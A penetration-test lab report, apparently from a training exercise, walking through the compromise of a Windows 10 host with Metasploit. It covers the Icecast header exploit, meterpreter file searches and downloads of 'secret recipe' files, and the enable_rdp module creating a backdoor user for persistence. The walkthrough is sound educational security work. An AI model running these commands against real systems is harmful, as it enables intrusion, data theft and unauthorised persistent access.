# PenTest & Report

For this red-team exercise, I was tasked with finding vulnerabilities in a Windows 10 machine, compromise the machine and escalate my privileges. 

GoodSecurity is a fictionnal company, however, the target machine is a real-life updated Windows 10 machine. Below you will find additional details regarding the lab environment used for this pentest.

## High-Level Summary

I was tasked with performing an internal penetration test on GoodCorp’s CEO, Hans Gruber. 

An internal penetration test is a dedicated attack against internally connected systems. 
The focus of this test is to perform attacks, similar to those of a hacker and attempt to infiltrate Hans’ computer and determine if it is at risk. 
My overall objective was to exploit any vulnerable software and find the secret recipe file on Hans’ computer, while reporting the findings back to GoodCorp.

When performing the internal penetration test, there were several alarming vulnerabilities that I identified on Hans’ desktop. 
When performing the attacks, I was able to gain access to his machine and find the secret recipe file by exploiting two programs that had major vulnerabilities. 

The details of the attack can be found in the ‘Findings’ category.


## Findings

Machine IP:
`192.168.0.20`
Hostname:
`MSEDGEWIN10`

### Vulnerability Exploited #1

Icecast Multimedia webserver.

I used the following exploit module from Metasploit:

```bash
Exploit/windows/http/icecast_header
```

#### Vulnerability Explanation:

This vulnerability is a locally-exploitable buffer overflow. 

The issue resides in the XSL parser not checking the size of XSL ‘when’, ‘if’, and ‘value-of’ tag values before copying them into a finite buffer in process memory.

This attack is a remote code execution attack. It leverages the buffer-overflow vulnerability to execute arbitrary code on the machine.

Buffers are memory storage regions and their mission is to hold data temporarily while it is transferred to another location. A buffer-overflow is when the volume of data that is supposed to be stored in the memory buffer exceeds its capacity.

If attackers know the memory layout of a program, they can feed an excess of data to that memory buffer in order to overwrite areas of the memory that hold executable code, replacing that executable code with their own code. Attackers can now craft payloads that will be sent to that part of the memory that executes code and have their own malicious payload executed on the victim’s system.

#### Severity:

This vulnerability is extremely severe, it took me just a few minutes to remotely execute arbitrary code on the target machine and gain remote access to it.

#### Proof of Concept:

1. Service and version scan using Nmap to determine which services are up and running:

Nmap command that performs a service and version scan against the target.

```bash
nmap -sV 192.168.0.20
```

![nmap -sV scan](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/nmap_sV_scan.png)


2. From the previous step, I found that the Icecast service is running. This server software for streaming media is notorious for its vulnerabilities. 

So I decided to start attacking this server using `Metasploit`.


I ran the SearchSploit commands to show available Icecast exploits:

```bash
searschsploit icecast
```

![nmap -sV scan](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/searchsploit_icecast.png)


3. Now that I know which exploits are available, let's start Metasploit with the following command:

```bash
msfconsole
```

4. Next, I searched for the icecast module and set the "Remote Host" to the IP of my target's machine in Metasploit using the following commands:

I used the command below to find the Icecast module:

```bash
search icecast
```

Next, I used the following command to use the module:

```bash
use 0
```

Next, I set the IP address of the remote host to my target's machine IP with the following command:

```bash
set RHOST 192.168.0.20
```

![icecast meta module setup](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/search_icecast_set_RHOST.png)

Next, I used the following command to run the module, which started a meterpreter session, giving me remote access to the target's machine:

```bash
run
```

The goal of this pentest was to look for a way to get into the CEO's computer and collect secret files. Now that I have remote access to his machine I can start looking for these secret files.

From the meterpreter session I started using the Icecast vulnerability, I ran the following command to look for a file called "secretfile". I used the following command to look for that file in the entire system, after a couple of minutes, I found the file and its path:

Command used:

```bash
search -f *secretfile*.txt
```

![secretfile found](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/secretfile_found.png)


Next, I was tasked with finding a secret recipe file, I ran the following command to look for it and after a few minutes, I found the file:

```bash
search -f *recipe*.txt
```

![recipe found](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/recipe_file_found.png)


Now that I found the secret files, I need to exfiltrate the files from the CEO's machine. I used the `download` command from my meterpreter session to download the files. Below the command I used and a screenshot of one of the file successfully exfiltrated:

```bash
download Drinks.recipe.txt
```

![recipe found](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/Download_drink_recipe.png)



### Vulnerability Exploited #2


I used the following exploit module from Metasploit:

```bash
windows/manage/enable_rdp
```

#### Vulnerability Explanation:

Now that I have direct access to the machine, I can further exploit the initial vulnerability and make sure that I install persistence via a backdoor on the machine so that, in the event that my initial payload is discovered and the system patched (Icecast vulnerability), I can still have full access to the machine (remotely) to continue my attack.

To do so, I used the post exploitation module `enable_rdp` to create a new user on my target’s machine, allowing me to access the machine remotely via RDP at a later time.

#### Severity:

This is a serious attack, a rogue user account is created which allows the attacker to access the victim’s machine to further compromise the system and move laterally within the network.

#### Proof of Concept:

I noticed that port 3389 is open and that the version of the remote Terminal Services running on the machine is vulnerable as seen in the screenshot below following a Nessus service and vulnerability scan:

![nessus scan](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/post_exploitation_2.png)


Since the service is not using NLA (Network Level Authentication), I know that I can successfully create a new user and complete user authentication before the full RDP connection is established with standard username/password to login and start the RDP session.

I set my current meterpreter session in the background in order to launch the post exploitation module `enable_rdp` in metasploit as seen below, all I had to do is to use the command “search 3389” to find a post exploitation module that will help me exploit the vulnerable service running on port 3389:

I put my meterpreter session in the background using the command:

```bash
bg
```

Next, I type the following command to find an exploit for services running on port 3389:

```bash
search 3389
```

![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/post_exploitation_3.png)

I decide to use module #5:



![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/post_exploitation_4.png)


Next, I set the username and password of the user account that I want to create on my target’s machine, in this case I set the username “Jack” and the password “123456” and ran the exploit.

Command to set the username:

```bash
set username jack
```

Command to set the password:

```bash
set password 123456
```

Now, I want to go back to my initial meterpreter session that I put in the background earlier, so I use the following command to set my previous session as the session to be used to run the exploit:

```bash
set session 1
```

I started the exploit with the command:

```bash
exploit
```

The exploit is successfully launched and the rogue user `jack` is created:


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/post_exploitation_5.png)


Following the successfully completed exploit, I went back to my meterpreter session and used the command `Shell` to get a Cmd prompt on my target’s machine and then ran the command `net user` to confirm that the new user “Jack “ was successfully created:


![post exploit](https://github.com/Sk3llington/PenTesting-Vulnerability-Assessment/blob/main/images/post_exploitation_6.png)






